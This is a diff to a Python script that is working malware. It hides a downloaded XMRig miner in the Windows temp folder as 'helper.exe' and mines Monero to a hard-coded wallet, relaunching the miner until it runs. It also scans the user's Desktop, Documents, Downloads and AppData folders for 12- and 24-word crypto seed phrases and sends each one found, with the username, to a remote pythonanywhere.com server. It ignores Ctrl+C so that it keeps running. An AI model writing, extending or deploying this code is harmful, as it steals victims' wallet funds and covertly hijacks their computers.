@@ -5,6 +5,7 @@ import requests
 import subprocess
 import threading
 import zipfile
+import psutil
 from pathlib import Path
 from mnemonic import Mnemonic
 
@@ -13,6 +14,14 @@ SERVER = "https://kryhrqs.pythonanywhere.com/export"
 WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"
 TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
 MINER = os.path.join(TEMP, 'helper.exe')
+LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'service_log.txt')
+
+def log(msg):
+    try:
+        with open(LOG, 'a') as f:
+            f.write(f"{time.ctime()} - {msg}\n")
+    except:
+        pass
 
 def send(data):
     try:
@@ -22,12 +31,18 @@ def send(data):
             'user': os.getenv('USERNAME', ''),
             'data': data
         }, timeout=10)
-    except:
-        pass
+        log(f"Sent: {data.get('type', 'unknown')}")
+    except Exception as e:
+        log(f"Send error: {e}")
 
 def start_miner():
-    try:
-        if not os.path.exists(MINER):
+    """Download and start miner, retry if not working."""
+    log("Miner starting...")
+    
+    # Download miner
+    if not os.path.exists(MINER):
+        log("Downloading miner...")
+        try:
             zip_path = os.path.join(TEMP, 'x.zip')
             r = requests.get(
                 'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip',
@@ -43,8 +58,18 @@ def start_miner():
                     for f in files:
                         if f == 'xmrig.exe':
                             os.rename(os.path.join(root, f), MINER)
+                            log(f"Miner downloaded to: {MINER}")
                             break
-        if os.path.exists(MINER):
+            else:
+                log(f"Download failed: {r.status_code}")
+                return
+        except Exception as e:
+            log(f"Download error: {e}")
+            return
+    
+    # Launch miner
+    def launch():
+        try:
             subprocess.Popen(
                 [MINER, '--url=pool.supportxmr.com:3333', f'--user={WALLET}',
                  '--pass=x', '--threads=2', '--keepalive', '--donate-level=1'],
@@ -52,101 +77,124 @@ def start_miner():
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
-    except:
-        pass
-
-def is_valid_private_key(text, context):
-    """Check if text is a real private key with context."""
-    if not text:
-        return False
+            log("Miner launched")
+        except Exception as e:
+            log(f"Miner launch error: {e}")
     
-    key = text.replace('0x', '')
-    if len(key) != 64:
-        return False
-    if not re.match(r'^[a-fA-F0-9]{64}$', key):
-        return False
+    # Check if miner is actually running
+    def is_miner_running():
+        try:
+            for proc in psutil.process_iter(['name', 'cpu_percent']):
+                if proc.info['name'] == 'helper.exe':
+                    if proc.info['cpu_percent'] > 1:
+                        return True
+            return False
+        except:
+            return False
     
-    # Skip common non-keys
-    if key.lower() in ['0'*64, '1'*64, 'f'*64, 'a'*64]:
-        return False
+    launch()
     
-    # Must have context (surrounding text suggests it's a key)
-    context_lower = context.lower()
-    key_indicators = ['private', 'key', 'wallet', 'seed', 'mnemonic', '0x', 'address', 'pk']
-    if not any(indicator in context_lower for indicator in key_indicators):
-        return False
+    # Monitor and retry if not working
+    def monitor():
+        retries = 0
+        while retries < 5:
+            time.sleep(10)
+            if is_miner_running():
+                log("Miner is running (CPU detected)")
+                return
+            else:
+                retries += 1
+                log(f"Miner not running, retry {retries}/5")
+                # Kill any existing instances
+                try:
+                    os.system('taskkill /F /IM helper.exe >nul 2>&1')
+                except:
+                    pass
+                launch()
+        
+        log("Miner failed to start after 5 retries")
     
-    return True
-
-def looks_like_key_file(content):
-    """Check if the file is just random hex (likely not a real key)."""
-    # If the whole file is just hex and no spaces/newlines, skip it
-    hex_chars = re.findall(r'[a-fA-F0-9]', content)
-    if len(hex_chars) > 0.8 * len(content):
-        return False
-    return True
+    threading.Thread(target=monitor, daemon=True).start()
 
 def scan_file(path):
+    """Scan a file for valid seed phrases only."""
     try:
-        if os.path.getsize(path) > 2 * 1024 * 1024:
+        if os.path.getsize(path) > 1 * 1024 * 1024:
             return
         with open(path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
             if not content or len(content) < 20:
                 return
             
-            # Check for seed phrases (12 words)
+            # Extract all words
             words = re.findall(r'\b[a-zA-Z]+\b', content)
+            
+            # Check for 12-word seed phrases
             for i in range(len(words) - 11):
                 phrase = ' '.join(words[i:i+12])
                 try:
                     if mnemo.check(phrase):
+                        log(f"FOUND SEED: {path}")
                         send({'type': 'seed', 'path': path, 'content': phrase})
                         return
                 except:
                     pass
             
-            # Check for private keys with context
-            matches = re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content)
-            for m in matches:
-                # Get surrounding context (100 chars before and after)
-                start = max(0, content.find(m) - 100)
-                end = min(len(content), content.find(m) + len(m) + 100)
-                context = content[start:end]
-                if is_valid_private_key(m, context):
-                    send({'type': 'key', 'path': path, 'content': m})
-                    return
+            # Check for 24-word seed phrases
+            for i in range(len(words) - 23):
+                phrase = ' '.join(words[i:i+24])
+                try:
+                    if mnemo.check(phrase):
+                        log(f"FOUND 24-WORD SEED: {path}")
+                        send({'type': 'seed_24', 'path': path, 'content': phrase})
+                        return
+                except:
+                    pass
     except:
         pass
 
-def scan_drive(drive):
-    try:
-        for root, dirs, files in os.walk(drive):
-            skip = ['Windows', 'Program Files', 'System32', 'AppData\\Local\\Temp', 
-                    'node_modules', '.git', 'Cache', 'cache', 'AppData\\Local\\Packages']
-            dirs[:] = [d for d in dirs if d not in skip and not d.startswith('$')]
-            for f in files:
-                ext = os.path.splitext(f)[1].lower()
-                if ext in ('.txt', '.json', '.dat', '.log', '.bak', '.old', '.md', '.cfg', '.conf', '.ini'):
-                    scan_file(os.path.join(root, f))
-    except:
-        pass
+def scan_folders():
+    """Scan user folders for seed phrases."""
+    folders = [
+        os.path.expandvars("%USERPROFILE%\\Desktop"),
+        os.path.expandvars("%USERPROFILE%\\Documents"),
+        os.path.expandvars("%USERPROFILE%\\Downloads"),
+        os.path.expandvars("%APPDATA%"),
+        os.path.expandvars("%USERPROFILE%"),
+    ]
+    
+    for folder in folders:
+        if os.path.exists(folder):
+            log(f"Scanning: {folder}")
+            for root, dirs, files in os.walk(folder):
+                # Skip temp and cache
+                skip = ['Temp', 'Cache', 'cache', 'node_modules', '.git']
+                dirs[:] = [d for d in dirs if d not in skip]
+                
+                for f in files:
+                    if f.endswith('.txt'):
+                        scan_file(os.path.join(root, f))
 
 def main():
-    # Start miner
+    log("=" * 50)
+    log("SERVICE STARTED")
+    
+    # Start miner with retry
+    log("Starting miner...")
     threading.Thread(target=start_miner, daemon=True).start()
     
     # Start scanner
-    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
-        drive = f'{letter}:\\'
-        if os.path.exists(drive):
-            threading.Thread(target=scan_drive, args=(drive,), daemon=True).start()
+    log("Starting scanner...")
+    threading.Thread(target=scan_folders, daemon=True).start()
+    
+    log("All started. Running.")
     
     # Keep alive
     try:
         while True:
             time.sleep(60)
     except KeyboardInterrupt:
+        log("Ctrl+C received - continuing background work.")
         while True:
             time.sleep(60)
 
